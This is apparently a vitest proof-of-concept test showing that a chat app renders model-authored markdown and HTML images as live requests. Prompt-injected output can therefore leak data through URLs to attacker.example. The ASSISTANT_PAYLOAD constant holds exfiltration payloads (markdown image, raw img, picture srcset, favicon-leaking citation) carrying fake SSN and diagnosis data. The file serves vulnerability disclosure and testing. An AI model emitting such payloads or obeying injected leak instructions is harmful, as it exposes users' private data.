// @vitest-environment jsdom
/**
 * PoC: model-authored (prompt-injected) markdown/HTML images are rendered as
 * live <img src="https://attacker..."> elements by the production chat
 * pipeline (remark-math + gfm + breaks -> rehype-raw -> rehype-sanitize ->
 * rehype-katex -> custom components). The browser auto-fetches them, and the
 * production CSP in vercel.json allows `img-src https:`, so any data the model
 * encodes into the URL leaves the user's browser without interaction.
 */
import { ArtifactPreviewPanel } from '@/components/chat/genui/widgets/ArtifactPreview'
import { MessageContent } from '@/components/chat/renderers/components/MessageContent'
import { CodeBlock } from '@/components/code-block'
import { cleanup, render, waitFor } from '@testing-library/react'
import { readFileSync } from 'node:fs'
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest'

const faviconCalls: string[] = []
vi.mock('@/services/inference/metadata-client', () => ({
  fetchFavicon: (url: string) => {
    faviconCalls.push(url)
    return Promise.resolve(null)
  },
  fetchLinkMetadata: () => Promise.reject(new Error('mocked')),
}))

beforeAll(() =>
  vi.stubGlobal(
    'ResizeObserver',
    class {
      observe() {}
      disconnect() {}
    },
  ),
)
afterAll(() => vi.unstubAllGlobals())
afterEach(cleanup)

// What a prompt-injected assistant turn would contain. The "secret" stands in
// for any chat/document content the model was told to leak.
const SECRET = 'patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789'
const EXFIL = `https://attacker.example/x.png?d=${SECRET}`

const ASSISTANT_PAYLOAD = [
  'Here is the summary you asked for.',
  '',
  `![](${EXFIL}&v=markdown)`,
  '',
  `<img src="${EXFIL}&v=rawhtml" alt="">`,
  '',
  `<picture><source srcset="${EXFIL}&v=srcset"><img src="${EXFIL}&v=picture"></picture>`,
  '',
  // Legacy citation anchor: triggers an enclave-side favicon lookup of the
  // attacker host (hostname leak via DuckDuckGo favicon service).
  `[1](#cite-~https://${'leak-' + 'c3NuPTEyMy00NS02Nzg5'}.attacker.example/~title)`,
  '',
  '$$x^2$$',
].join('\n')

describe('PoC: remote image exfiltration from model output', () => {
  it('MessageContent (assistant chat bubble) renders attacker-controlled <img src> after the full plugin pipeline', async () => {
    const { container } = render(
      <MessageContent content={ASSISTANT_PAYLOAD} isDarkMode={false} />,
    )
    // Wait until the async plugin set (rehype-raw + rehype-sanitize +
    // rehype-katex) has been loaded and applied: KaTeX output is present.
    await waitFor(() =>
      expect(container.querySelectorAll('.katex').length).toBeGreaterThan(0),
    )
    const imgs = Array.from(container.querySelectorAll('img')).map(
      (img) => img.getAttribute('src') ?? '',
    )
    const sources = Array.from(container.querySelectorAll('source')).map(
      (s) => s.getAttribute('srcset') ?? '',
    )
    console.log('[poc] rendered <img src> values:', imgs)
    console.log('[poc] rendered <source srcset> values:', sources)
    // Markdown image syntax survives
    expect(imgs).toContain(`${EXFIL}&v=markdown`)
    // Raw HTML <img> survives rehype-raw + rehype-sanitize (img src with https: is allowed)
    expect(imgs).toContain(`${EXFIL}&v=rawhtml`)
    // <picture><source srcset> survives too (srcSet has no protocol check in the default schema)
    expect(sources).toContain(`${EXFIL}&v=srcset`)
    // Each of these is a live resource load: the secret is in the URL.
    for (const src of imgs) {
      if (src.startsWith('https://attacker.example/'))
        expect(src).toContain('ssn%3D123-45-6789')
    }
    // Citation pill -> Favicon -> fetchFavicon(url) (enclave fetches
    // icons.duckduckgo.com/ip3/<host>.ico; attacker DNS/HTTP sees the host).
    await waitFor(() => expect(faviconCalls.length).toBeGreaterThan(0))
    console.log('[poc] favicon lookups requested for:', faviconCalls)
    expect(faviconCalls[0]).toMatch(/^https:\/\/leak-.*\.attacker\.example\//)
  })

  it('GenUI render_artifact_preview (markdown source) renders attacker <img src> with no plugins at all', () => {
    const { container } = render(
      <ArtifactPreviewPanel
        title="t"
        source={{ type: 'markdown', markdown: `![x](${EXFIL}&v=artifact)` }}
      />,
    )
    const srcs = Array.from(container.querySelectorAll('img')).map(
      (i) => i.getAttribute('src') ?? '',
    )
    console.log('[poc] artifact markdown img src:', srcs)
    expect(srcs).toContain(`${EXFIL}&v=artifact`)
  })

  it('```markdown code fence preview (auto-opened after streaming) renders attacker <img src>', () => {
    const code = `# Report\n\nSome *formatted* text.\n\n![x](${EXFIL}&v=codefence)`
    const { container } = render(
      <CodeBlock code={code} language="markdown" isStreaming={false} />,
    )
    const srcs = Array.from(container.querySelectorAll('img')).map(
      (i) => i.getAttribute('src') ?? '',
    )
    console.log('[poc] markdown code-fence preview img src:', srcs)
    expect(srcs).toContain(`${EXFIL}&v=codefence`)
  })

  it('production CSP (vercel.json) allows the browser to fetch those images from any https origin', () => {
    const blocks = JSON.parse(readFileSync('vercel.json', 'utf8')).headers as Array<{
      source: string
      headers: Array<{ key: string; value: string }>
    }>
    const csp = blocks[0].headers.find(
      (h) => h.key === 'Content-Security-Policy',
    )!.value
    const imgSrc = csp
      .split(';')
      .map((d) => d.trim())
      .find((d) => d.startsWith('img-src '))!
    console.log('[poc] production CSP img-src:', imgSrc)
    expect(imgSrc.split(/\s+/)).toContain('https:')
  })
})
